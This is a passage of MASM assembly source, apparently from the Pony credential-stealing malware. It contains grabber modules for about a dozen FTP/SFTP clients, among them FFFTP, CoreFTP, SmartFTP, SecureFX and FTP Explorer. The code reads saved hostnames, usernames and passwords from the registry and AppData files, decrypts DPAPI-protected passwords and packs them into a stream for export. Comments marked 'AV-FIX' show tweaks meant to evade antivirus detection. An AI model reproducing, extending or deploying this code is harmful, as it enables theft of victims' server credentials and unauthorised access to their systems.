		invoke	CommonAppendFile, stream, eax, ITEMHDR_ID or 1
		call	MemFree
	.ENDIF

	; dat directory path in registry
	invoke	RegReadValueStr, dwCurrentUserKey, offset CBulletRegPath3, offset CBulletRegValue2, NULL
	.IF	eax
		push	eax
		invoke	BulletProofRecScan, stream, eax
		call	MemFree
	.ENDIF

	invoke	RegReadValueStr, dwCurrentUserKey, offset CBulletRegPath4, offset CBulletRegValue2, NULL
	.IF	eax
		push	eax
		invoke	BulletProofRecScan, stream, eax
		call	MemFree
	.ENDIF

	invoke	RegReadValueStr, dwCurrentUserKey, offset CBulletRegPath5, offset CBulletRegValue3, NULL
	.IF	eax
		push	eax
		invoke	BulletProofRecScan, stream, eax
		call	MemFree
	.ENDIF

	invoke	BulletProofCommonFileScan, stream, CSIDL_LOCAL_APPDATA
	invoke	BulletProofCommonFileScan, stream, CSIDL_APPDATA
	invoke	BulletProofCommonFileScan, stream, CSIDL_COMMON_APPDATA

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabBulletProof endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; SmartFTP 2.x-4.x
; http://www.smartftp.com/
; Tested: SmartFTP 4.0, build 1207
; Tested: SmartFTP 4.0, build 1245
; SFTP: not implemented

IFDEF COMPILE_MODULE_SMARTFTP

.data
	CSmartFTPXmlMask	db	'.xml',0
	CSmartFTPAppDataDir	db	'\SmartFTP',0
	CSmartFTPFavMask	db	'Favorites.dat',0
	CSmartFTPHistMask	db	'_istory.dat',0

.code

SmartFTPCommonFileScan proc stream, csidl
	invoke	SHGetFolderPathStr, csidl
	.IF	eax
		invoke	PonyStrCatFreeArg1, eax, offset CSmartFTPAppDataDir
		push	eax
		push	eax
		push	eax
		invoke	CommonFileScan, stream, eax, offset CSmartFTPXmlMask, ITEMHDR_ID or 0
		pop	eax
		invoke	CommonFileScan, stream, eax, offset CSmartFTPFavMask, ITEMHDR_ID or 1
		pop	eax
		invoke	CommonFileScan, stream, eax, offset CSmartFTPHistMask, ITEMHDR_ID or 2
		call	MemFree
	.ENDIF
	ret
SmartFTPCommonFileScan endp

GrabSmartFTP proc stream
	LOCAL	hdr_ofs: DWORD
	
	invoke	StreamWriteModuleHeader, stream, MODULE_SMARTFTP, 0
	mov	hdr_ofs, eax

	mov	byte ptr[CSmartFTPHistMask], 'H'
	
	invoke	SmartFTPCommonFileScan, stream, CSIDL_APPDATA
	invoke	SmartFTPCommonFileScan, stream, CSIDL_COMMON_APPDATA
	invoke	SmartFTPCommonFileScan, stream, CSIDL_LOCAL_APPDATA
	
	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabSmartFTP endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; TurboFTP
; http://www.turboftp.com/
; Tested: V 6.30 Build 872
; Tested: V 6.30 Build 889 x64
; Tested: V 6.30 Build 912 x64
; SFTP: implemented

IFDEF COMPILE_MODULE_TURBOFTP

.data
	CTurboFTPDatMask	db	'_ddrbk.dat',0
	CTurboFTPQuickMask	db	'quick.dat',0
	CTurboFTPAppDataDir	db	'\TurboFTP',0
	CTurboFTPRegPath	db	'Software\TurboFTP',0
	CTurboFTPRegValue	db	'installpath',0
.code

TurboFTPScanFiles proc stream, file_mask, item_type
	invoke	RegReadValueStr, dwCurrentUserKey, offset CTurboFTPRegPath, offset CTurboFTPRegValue, NULL
	.IF	eax
		push	eax
		invoke	CommonFileScan, stream, eax, file_mask, item_type
		call	MemFree
	.ENDIF
	
	invoke	RegReadValueStr, HKEY_LOCAL_MACHINE, offset CTurboFTPRegPath, offset CTurboFTPRegValue, NULL
	.IF	eax
		push	eax
		invoke	CommonFileScan, stream, eax, file_mask, item_type
		call	MemFree
	.ENDIF

	invoke	AppDataCommonFileScan, stream, offset CTurboFTPAppDataDir, file_mask, item_type
	ret
TurboFTPScanFiles endp

GrabTurboFTP proc stream
	LOCAL	hdr_ofs: DWORD
	
	invoke	StreamWriteModuleHeader, stream, MODULE_TURBOFTP, 0
	mov	hdr_ofs, eax

	mov	byte ptr[CTurboFTPDatMask], 'a'
	
	invoke	TurboFTPScanFiles, stream, offset CTurboFTPDatMask, ITEMHDR_ID or 0
	invoke	TurboFTPScanFiles, stream, offset CTurboFTPQuickMask, ITEMHDR_ID or 1
	
	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabTurboFTP endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; FFFTP
; http://www2.biglobe.ne.jp/sota/ffftp-e.html
; Tested: Version 1.97b
; SFTP: not supported

IFDEF COMPILE_MODULE_FFFTP

.data
	CFFFTPRegPath		db	'Software\Sota\FFFTP',0
	CFFFTPRegCredSalt	db	'CredentialSalt',0
	CFFFTPRegCredCheck	db	'CredentialCheck',0
	CFFFTPRegOptionsPath	db	'Software\Sota\FFFTP\Options',0
	CFFFTPRegValuePassword	db	'Password',0
	CFFFTPRegValueUserName	db	'UserName',0
	CFFFTPRegValueHost	db	'HostAdrs',0
	CFFFTPRegValueRemDir	db	'RemoteDir',0
	CFFFTPRegValuePort	db	'Port',0
	
.code

FFFTPScanReg proc stream, BasePath
	LOCAL	hkHandle: DWORD
	LOCAL	KeyIndex: DWORD
	LOCAL	dwBufLen: DWORD
	LOCAL	lpBuf[2048]: BYTE
	LOCAL	S: DWORD
	LOCAL	Host: DWORD
	LOCAL	User: DWORD
	LOCAL	Password: DWORD
	LOCAL	RemDir: DWORD
	LOCAL	Port: DWORD
	LOCAL	dwPortLen: DWORD
	
	invoke	RegOpenKey, dwCurrentUserKey, BasePath, addr hkHandle
	.IF	!eax
		mov	KeyIndex, 0
		.WHILE	TRUE
			mov	dwBufLen, 2047
			invoke	RegEnumKeyEx, hkHandle, KeyIndex, addr lpBuf, addr dwBufLen, NULL, NULL, NULL, NULL
			.IF	eax
				.BREAK
			.ENDIF
			
			invoke	PonyStrCat, BasePath, addr szSlash
			push	eax
			mov	edx, eax
			invoke	PonyStrCat, edx, addr lpBuf
			mov	S, eax
			call	MemFree
			
			invoke	RegReadValueStr, dwCurrentUserKey, S, addr CFFFTPRegValuePassword, NULL
			mov	Password, eax 
			invoke	RegReadValueStr, dwCurrentUserKey, S, addr CFFFTPRegValueHost, NULL
			mov	Host, eax 
			invoke	RegReadValueStr, dwCurrentUserKey, S, addr CFFFTPRegValueUserName, NULL
			mov	User, eax 
			invoke	RegReadValueStr, dwCurrentUserKey, S, addr CFFFTPRegValueRemDir, NULL
			mov	RemDir, eax 
			invoke	RegReadValueStr, dwCurrentUserKey, S, addr CFFFTPRegValuePort, addr dwPortLen
			.IF	eax && dwPortLen == 4
				m2m	Port, dword ptr[eax]
				invoke	MemFree, eax
			.ELSE
				.IF	eax
					invoke	MemFree, eax
				.ENDIF
				mov	Port, 21
			.ENDIF
			
			.IF	Password && Host && User
				; export data, type = 0000: Host | User | Pass | Dir | Port
				invoke	StreamWriteDWORD, stream, ITEMHDR_ID or 0
				invoke	StreamWriteString, stream, Host
				invoke	StreamWriteString, stream, User
				invoke	StreamWriteString, stream, Password
				invoke	StreamWriteString, stream, RemDir
				invoke	StreamWriteDWORD, stream, Port
			.ENDIF
			
			invoke	MemFree, Password
			invoke	MemFree, Host
			invoke	MemFree, User
			invoke	MemFree, RemDir
			
			invoke	MemFree, S
			inc	KeyIndex
		.ENDW
		invoke	RegCloseKey, hkHandle
	.ENDIF
	ret
FFFTPScanReg endp

GrabFFFTP proc stream
	LOCAL	hdr_ofs: DWORD
	LOCAL	regdata_len: DWORD
	
	invoke	StreamWriteModuleHeader, stream, MODULE_FFFTP, 0
	mov	hdr_ofs, eax
	
	; CredentialSalt
	invoke	RegReadValueStr, dwCurrentUserKey, offset CFFFTPRegPath, offset CFFFTPRegCredSalt, addr regdata_len
	.IF	eax
		push	eax
		invoke	CommonAppendData, stream, eax, regdata_len, ITEMHDR_ID or 1
		call	MemFree
	.ENDIF
	
	; CredentialCheck
	invoke	RegReadValueStr, dwCurrentUserKey, offset CFFFTPRegPath, offset CFFFTPRegCredCheck, addr regdata_len
	.IF	eax
		push	eax
		invoke	CommonAppendData, stream, eax, regdata_len, ITEMHDR_ID or 2
		call	MemFree
	.ENDIF
	
	; Find passwords
	invoke	FFFTPScanReg, stream, offset CFFFTPRegOptionsPath
	
	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabFFFTP endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; CoffeeCupFTP
; SFTP: not supported

IFDEF COMPILE_MODULE_COFFEECUPFTP

.data
	CCoffeeCupFTPHost	db	'HostName',0
	CCoffeeCupFTPPort	db	'Port',0
	CCoffeeCupFTPUsername	db	'Username',0
	CCoffeeCupFTPPassword	db	'Password',0
	CCoffeeCupFTPDir	db	'HostDirName',0
	CCoffeeCupFTPBasePath	db	'Software\CoffeeCup Software\Internet\Profiles',0

.code

CoffeeFTPScanReg proc stream, BasePath
	LOCAL	hkHandle: DWORD
	LOCAL	KeyIndex: DWORD
	LOCAL	dwBufLen: DWORD
	LOCAL	lpBuf[2048]: BYTE
	LOCAL	S: DWORD
	LOCAL	Host: DWORD
	LOCAL	User: DWORD
	LOCAL	Password: DWORD
	LOCAL	Port: DWORD
	LOCAL	Dir: DWORD
	
	invoke	RegOpenKey, dwCurrentUserKey, BasePath, addr hkHandle
	.IF	!eax
		mov	KeyIndex, 0
		.WHILE	TRUE
			mov	dwBufLen, 2047
			invoke	RegEnumKeyEx, hkHandle, KeyIndex, addr lpBuf, addr dwBufLen, NULL, NULL, NULL, NULL
			.IF	eax
				.BREAK
			.ENDIF
			
			invoke	PonyStrCat, BasePath, addr szSlash
			push	eax
			mov	edx, eax
			invoke	PonyStrCat, edx, addr lpBuf
			mov	S, eax
			call	MemFree
			
			invoke	RegReadValueStr, dwCurrentUserKey, S, addr CCoffeeCupFTPPassword, NULL
			mov	Password, eax 
			invoke	RegReadValueStr, dwCurrentUserKey, S, addr CCoffeeCupFTPHost, NULL
			mov	Host, eax 
			invoke	RegReadValueStr, dwCurrentUserKey, S, addr CCoffeeCupFTPPort, NULL
			mov	Port, eax 
			invoke	RegReadValueStr, dwCurrentUserKey, S, addr CCoffeeCupFTPUsername, NULL
			mov	User, eax 
			invoke	RegReadValueStr, dwCurrentUserKey, S, addr CCoffeeCupFTPDir, NULL
			mov	Dir, eax 
			
			.IF	Password && Host && User
				; export data, type = 0000: Host | User | Pass | Port | Dir
				invoke	StreamWriteDWORD, stream, ITEMHDR_ID or 0
				invoke	StreamWriteString, stream, Host
				invoke	StreamWriteString, stream, User
				invoke	StreamWriteString, stream, Password
				invoke	StreamWriteString, stream, Port
				invoke	StreamWriteString, stream, Dir
			.ENDIF
			
			invoke	MemFree, Password
			invoke	MemFree, Host
			invoke	MemFree, User
			invoke	MemFree, Port
			invoke	MemFree, Dir
			
			; recursively scan subfolders
			invoke	CoffeeFTPScanReg, stream, S			
			invoke	MemFree, S
			
			inc	KeyIndex			
		.ENDW
		invoke	RegCloseKey, hkHandle
	.ENDIF
	ret
CoffeeFTPScanReg endp

GrabCoffeeCupFTP proc stream
	LOCAL	hdr_ofs: DWORD
	
	invoke	StreamWriteModuleHeader, stream, MODULE_COFFEECUPFTP, 0
	mov	hdr_ofs, eax

	invoke	CoffeeFTPScanReg, stream, addr CCoffeeCupFTPBasePath

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabCoffeeCupFTP endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; CoreFTP
; http://www.coreftp.com/
; Tested: CoreFTP LE/Pro 2.2, build 1687
; Tested: CoreFTP LE/Pro 2.2, build 1747
; SFTP: implemented

IFDEF COMPILE_MODULE_COREFTP

.data
	CCoreFTPBasePath	db	'Software\FTPWare\COREFTP\Sites',0
	CCoreFTPHostValue	db	'Host',0
	CCoreFTPUserValue	db	'User',0
	CCoreFTPPortValue	db	'Port',0
	CCoreFTPPasswordValue	db	'PW',0
	CCoreFTPPathValue	db	'PthR',0
	CCoreFTPSSHValue	db	'SSH',0

.code

CoreFTPScanReg proc stream, BasePath
	LOCAL	hkHandle: DWORD
	LOCAL	KeyIndex: DWORD
	LOCAL	dwBufLen: DWORD
	LOCAL	lpBuf[2048]: BYTE
	LOCAL	S: DWORD
	LOCAL	Host: DWORD
	LOCAL	User: DWORD
	LOCAL	Password: DWORD
	LOCAL	RemDir: DWORD
	LOCAL	Port: DWORD
	LOCAL	SSH: DWORD
	LOCAL	dwPortLen: DWORD
	LOCAL	dwSSHLen: DWORD
	
	invoke	RegOpenKey, dwCurrentUserKey, BasePath, addr hkHandle
	.IF	!eax
		mov	KeyIndex, 0
		.WHILE	TRUE
			mov	dwBufLen, 2047
			invoke	RegEnumKeyEx, hkHandle, KeyIndex, addr lpBuf, addr dwBufLen, NULL, NULL, NULL, NULL
			.IF	eax
				.BREAK
			.ENDIF
			
			invoke	PonyStrCat, BasePath, addr szSlash
			mov	edx, eax
			invoke	PonyStrCatFreeArg1, edx, addr lpBuf
			mov	S, eax
			
			invoke	RegReadValueStr, dwCurrentUserKey, S, addr CCoreFTPPasswordValue, NULL
			mov	Password, eax 
			invoke	RegReadValueStr, dwCurrentUserKey, S, addr CCoreFTPHostValue, NULL
			mov	Host, eax 
			invoke	RegReadValueStr, dwCurrentUserKey, S, addr CCoreFTPUserValue, NULL
			mov	User, eax 
			invoke	RegReadValueStr, dwCurrentUserKey, S, addr CCoreFTPPathValue, NULL
			mov	RemDir, eax 
			invoke	RegReadValueStr, dwCurrentUserKey, S, addr CCoreFTPPortValue, addr dwPortLen
			.IF	eax && dwPortLen == 4
				m2m	Port, dword ptr[eax]
				invoke	MemFree, eax
			.ELSE
				.IF	eax
					invoke	MemFree, eax
				.ENDIF
				mov	Port, 21
			.ENDIF
			
			invoke	RegReadValueStr, dwCurrentUserKey, S, addr CCoreFTPSSHValue, addr dwSSHLen
			mov	SSH, eax

			.IF	Password && Host && User
				; export data, type = 0000: Host | User | Pass | Port | Dir
				; export data, type = 0010: Host | User | Pass | Port | Dir | SSH
				invoke	StreamWriteDWORD, stream, ITEMHDR_ID or 10h
				invoke	StreamWriteString, stream, Host
				invoke	StreamWriteString, stream, User
				invoke	StreamWriteString, stream, Password
				invoke	StreamWriteDWORD, stream, Port
				invoke	StreamWriteString, stream, RemDir

				.IF	SSH && dwSSHLen == 4
					mov	eax, SSH
					invoke	StreamWriteDWORD, stream, dword ptr[eax]
				.ELSE
					invoke	StreamWriteDWORD, stream, 0
				.ENDIF
			.ENDIF
			
			invoke	MemFree, Password
			invoke	MemFree, Host
			invoke	MemFree, User
			invoke	MemFree, RemDir
			invoke	MemFree, SSH
			
			invoke	MemFree, S
			inc	KeyIndex
		.ENDW
		invoke	RegCloseKey, hkHandle
	.ENDIF
	ret
CoreFTPScanReg endp

GrabCoreFTP proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_COREFTP, 0
	mov	hdr_ofs, eax

	invoke	CoreFTPScanReg, stream, addr CCoreFTPBasePath

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabCoreFTP endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; FTP Explorer
; http://www.ftpx.com/
; Tested: Version 9.11.9 (Build 005)
; Tested: Version 10.5.19 (Build 001)
; SFTP: not supported

IFDEF COMPILE_MODULE_FTPEXPLORER

.data
	CFTPExplorerXmlMask	db	'profiles.xml',0
	CFTPExplorerAppDataDir	db	'\FTP Explorer',0
	CFTPExplorerRegPath	db	'Software\FTP Explorer\FTP Explorer\Workspace\MFCToolBar-224',0
	CFTPExplorerRegValue	db	'Buttons',0
	CFTPExplorerBasePath	db	'Software\FTP Explorer\Profiles',0
	CFTPExplorerPasswordValue	db	'Password',0
	CFTPExplorerPasswordTypeValue	db	'PasswordType',0
	CFTPExplorerHostValue	db	'Host',0
	CFTPExplorerUserValue	db	'Login',0
	CFTPExplorerPortValue	db	'Port',0
	CFTPExplorerPathValue	db	'InitialPath',0

.code

FTPExplorerScanReg proc stream, BasePath
	LOCAL	hkHandle: DWORD
	LOCAL	KeyIndex: DWORD
	LOCAL	dwBufLen: DWORD
	LOCAL	lpBuf[2048]: BYTE
	LOCAL	S: DWORD
	LOCAL	Host: DWORD
	LOCAL	User: DWORD
	LOCAL	Password: DWORD
	LOCAL	RemDir: DWORD
	LOCAL	Port: DWORD
	LOCAL	dwPortLen: DWORD
	LOCAL	PasswordType: DWORD
	LOCAL	dwPasswordTypeLen: DWORD
	LOCAL	dwPasswordLen: DWORD
	
	invoke	RegOpenKey, dwCurrentUserKey, BasePath, addr hkHandle
	.IF	!eax
		mov	KeyIndex, 0
		.WHILE	TRUE
			mov	dwBufLen, 2047
			invoke	RegEnumKeyEx, hkHandle, KeyIndex, addr lpBuf, addr dwBufLen, NULL, NULL, NULL, NULL
			.IF	eax
				.BREAK
			.ENDIF
			
			invoke	PonyStrCat, BasePath, addr szSlash
			mov	edx, eax
			invoke	PonyStrCatFreeArg1, edx, addr lpBuf
			mov	S, eax
			
			invoke	RegReadValueStr, dwCurrentUserKey, S, addr CFTPExplorerPasswordValue, addr dwPasswordLen
			mov	Password, eax 
			invoke	RegReadValueStr, dwCurrentUserKey, S, addr CFTPExplorerHostValue, NULL
			mov	Host, eax 
			invoke	RegReadValueStr, dwCurrentUserKey, S, addr CFTPExplorerUserValue, NULL
			mov	User, eax 
			invoke	RegReadValueStr, dwCurrentUserKey, S, addr CFTPExplorerPathValue, NULL
			mov	RemDir, eax 
			invoke	RegReadValueStr, dwCurrentUserKey, S, addr CFTPExplorerPortValue, addr dwPortLen
			.IF	eax && dwPortLen == 4
				m2m	Port, dword ptr[eax]
			.ELSE
				mov	Port, 21
			.ENDIF
			invoke	MemFree, eax

			; Password type
			invoke	RegReadValueStr, dwCurrentUserKey, S, addr CFTPExplorerPasswordTypeValue, addr dwPasswordTypeLen
			.IF	eax && dwPasswordTypeLen == 4
				m2m	PasswordType, dword ptr[eax]
			.ELSE
				mov	PasswordType, 0
			.ENDIF
			invoke	MemFree, eax

			.IF	Password && PasswordType == 2
				invoke	CommonCryptUnprotectData, Password, addr dwPasswordLen, NULL
				.IF	!eax || !dwPasswordLen
					invoke	MemFree, Password
					mov	Password, NULL
				.ENDIF
			.ENDIF
			
			.IF	Password && Host && User
				; export data, type = 0002: Host | User | Pass | Port | Dir
				invoke	StreamWriteDWORD, stream, ITEMHDR_ID or 2h
				invoke	StreamWriteString, stream, Host
				invoke	StreamWriteString, stream, User
				invoke	StreamWriteBinaryString, stream, Password, dwPasswordLen
				invoke	StreamWriteDWORD, stream, Port
				invoke	StreamWriteString, stream, RemDir
			.ENDIF
			
			invoke	MemFree, Password
			invoke	MemFree, Host
			invoke	MemFree, User
			invoke	MemFree, RemDir
			
			invoke	MemFree, S
			inc	KeyIndex
		.ENDW
		invoke	RegCloseKey, hkHandle
	.ENDIF
	ret
FTPExplorerScanReg endp

GrabFTPExplorer proc stream
	LOCAL	hdr_ofs: DWORD
	LOCAL	dwDataLen: DWORD
	LOCAL	lpData: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_FTPEXPLORER, 0
	mov	hdr_ofs, eax

	invoke	AppDataCommonFileScan, stream, offset CFTPExplorerAppDataDir, offset CFTPExplorerXmlMask, ITEMHDR_ID or 0
	invoke	RegReadValueStr, dwCurrentUserKey, offset CFTPExplorerRegPath, offset CFTPExplorerRegValue, addr dwDataLen
	.IF	eax
		mov	lpData, eax
		invoke	StreamWriteDWORD, stream, ITEMHDR_ID or 1
		invoke	StreamWriteBinaryString, stream, lpData, dwDataLen
		invoke	MemFree, lpData
	.ENDIF

	invoke	FTPExplorerScanReg, stream, offset CFTPExplorerBasePath

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabFTPExplorer endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Frigate3 FTP
; http://www.frigate3.com/rus/index.php
; Tested: Frigate 3.36
; SFTP: implemented

IFDEF COMPILE_MODULE_FRIGATEFTP

.data
	CFrigateFTPXmlMask	db	'FtpSite.xml',0
	CFrigateFTPAppDataDir	db	'\Frigate3',0
.code

GrabFrigateFTP proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_FRIGATEFTP, 0
	mov	hdr_ofs, eax

	invoke	AppDataCommonFileScan, stream, offset CFrigateFTPAppDataDir, offset CFrigateFTPXmlMask, ITEMHDR_ID or 0

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabFrigateFTP endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; SecureFX 6.6
; http://www.vandyke.com/products/securefx/
; Tested: Version 6.7.1 (build 188) x86
; Tested: Version 6.7.3 (build 292) x64
; Tested: Version 6.7.5 (build 441) x86
; SFTP: implemented

IFDEF COMPILE_MODULE_SECUREFX

.data
	CSecureFXIniFileMask	db	'.ini',0
	CSecureFXAppDataDir	db	'_VanDyke\Config\Sessions',0 ; AV-FIX
	CSecureFXConfigDir	db	'\Sessions',0
	CSecureFXRegConfigPath	db	'Software\VanDyke\SecureFX',0
	CSecureFXRegConfigValue	db	'Config Path',0
.code

GrabSecureFX proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_SECUREFX, 0
	mov	hdr_ofs, eax
	
	mov	byte ptr[CSecureFXAppDataDir], '\' ; AV-FIX
	invoke	AppDataCommonFileScan, stream, offset CSecureFXAppDataDir, offset CSecureFXIniFileMask, ITEMHDR_ID or 0
	
	invoke	RegReadValueStr, dwCurrentUserKey, offset CSecureFXRegConfigPath, offset CSecureFXRegConfigValue, NULL
	.IF	eax
		invoke	PonyStrCatFreeArg1, eax, offset CSecureFXConfigDir
		push	eax
		invoke	CommonFileScan, stream, eax, offset CSecureFXIniFileMask, ITEMHDR_ID or 0
		call	MemFree		
	.ENDIF

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabSecureFX endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; UltraFXP 1.7
; http://www.ultrafxp.com/
; Tested: UltraFXP Free Edition v1.07
; SFTP: implemented

IFDEF COMPILE_MODULE_ULTRAFXP

.data
	CUltraFXPInstallName	db	'UltraFXP',0
	CUltraFXPSitesFile	db	'\sites.xml',0
	
.code

GrabUltraFXP proc uses esi edi stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_ULTRAFXP, 0
	mov	hdr_ofs, eax

	mov	esi, lpInstalledList
	mov	edi, lpInstalledNames
	.IF	byte ptr[edi]
	@n:
		invoke	StrStrI, edi, offset CUltraFXPInstallName
		.IF	eax
			invoke	ExtractFilePath, esi
			invoke	PonyStrCatFreeArg1, eax, offset CUltraFXPSitesFile
			push	eax
			invoke	CommonAppendFile, stream, eax, ITEMHDR_ID or 0
			call	MemFree			
		.ENDIF		
		.WHILE	byte ptr[esi]
			inc	esi
		.ENDW
		inc	esi
		@Next	@n
	.ENDIF
	
	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabUltraFXP endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; FTPRush 2.1.4, 2.1.5
; http://www.wftpserver.com/ftprush.htm
; Tested: Version 2.1.5 UNICODE
; Tested: Version 2.1.8
; SFTP: implemented

IFDEF COMPILE_MODULE_FTPRUSH

.data
	CFTPRushAppDataDir	db	'\FTPRush',0
	CFTPRushXmlFileMask	db	'RushSite.xml',0
	
.code

GrabFTPRush proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_FTPRUSH, 0
	mov	hdr_ofs, eax
	
	invoke	AppDataCommonFileScan, stream, offset CFTPRushAppDataDir, offset CFTPRushXmlFileMask, ITEMHDR_ID or 0
		
	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabFTPRush endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; WebSitePublisher 2.1.5
; http://www.cryer.co.uk/downloads/websitepublisher/
; Tested: Version 2.2.0 (Build 2697)
; SFTP: not supported

IFDEF COMPILE_MODULE_WEBSITEPUBLISHER

.data
	CWebSitePublisherServer		db	'Server',0
	CWebSitePublisherUser		db	'Username',0
	CWebSitePublisherPassword	db	'Password',0
	CWebSitePublisherPort		db	'FtpPort',0
	CWebSitePublisherBasePath	db	'Software\Cryer\WebSitePublisher',0	

.code

WebSitePublisherScanReg proc stream, BasePath
	LOCAL	hkHandle: DWORD
	LOCAL	KeyIndex: DWORD
	LOCAL	dwBufLen: DWORD
	LOCAL	lpBuf[2048]: BYTE
	LOCAL	S: DWORD
	LOCAL	Host: DWORD
	LOCAL	User: DWORD
	LOCAL	Password: DWORD
	LOCAL	Port: DWORD
	LOCAL	dwPortLen: DWORD
	
	invoke	RegOpenKey, dwCurrentUserKey, BasePath, addr hkHandle
	.IF	!eax
		mov	KeyIndex, 0
		.WHILE	TRUE
			mov	dwBufLen, 2047
			invoke	RegEnumKeyEx, hkHandle, KeyIndex, addr lpBuf, addr dwBufLen, NULL, NULL, NULL, NULL
			.IF	eax
				.BREAK
			.ENDIF
			
			invoke	PonyStrCat, BasePath, addr szSlash
			push	eax
			mov	edx, eax
			invoke	PonyStrCat, edx, addr lpBuf
			mov	S, eax
			call	MemFree
			
			invoke	RegReadValueStr, dwCurrentUserKey, S, addr CWebSitePublisherPassword, NULL
			mov	Password, eax 
			invoke	RegReadValueStr, dwCurrentUserKey, S, addr CWebSitePublisherServer, NULL
			mov	Host, eax 
			invoke	RegReadValueStr, dwCurrentUserKey, S, addr CWebSitePublisherUser, NULL
			mov	User, eax 

			invoke	RegReadValueStr, dwCurrentUserKey, S, addr CWebSitePublisherPort, addr dwPortLen
			.IF	eax && dwPortLen == 4
				m2m	Port, dword ptr[eax]
				invoke	MemFree, eax
			.ELSE
				.IF	eax
					invoke	MemFree, eax
				.ENDIF
				mov	Port, 21
			.ENDIF
			
			.IF	Password && Host && User
				; export data, type = 0000: Host | User | Pass | Port
				invoke	StreamWriteDWORD, stream, ITEMHDR_ID or 0
				invoke	StreamWriteString, stream, Host
				invoke	StreamWriteString, stream, User
				invoke	StreamWriteString, stream, Password
				invoke	StreamWriteDWORD, stream, Port
			.ENDIF
			
			invoke	MemFree, Password
			invoke	MemFree, Host
			invoke	MemFree, User

			invoke	MemFree, S
			inc	KeyIndex
		.ENDW
		invoke	RegCloseKey, hkHandle
	.ENDIF
	ret
WebSitePublisherScanReg endp

GrabWebSitePublisher proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_WEBSITEPUBLISHER, 0
	mov	hdr_ofs, eax
	
	invoke	WebSitePublisherScanReg, stream, offset CWebSitePublisherBasePath 
	
	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabWebSitePublisher endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; BitKinex 3.2.3
; http://www.bitkinex.com/
; Tested: BitKinex 3.2.3
; SFTP: implemented

IFDEF COMPILE_MODULE_BITKINEX

.data
	CBitKinexAppDataDir	db	'\BitKinex',0
	CBitKinexXmlFileMask	db	'bitkinex.ds',0
	
.code

GrabBitKinex proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_BITKINEX, 0
	mov	hdr_ofs, eax
	
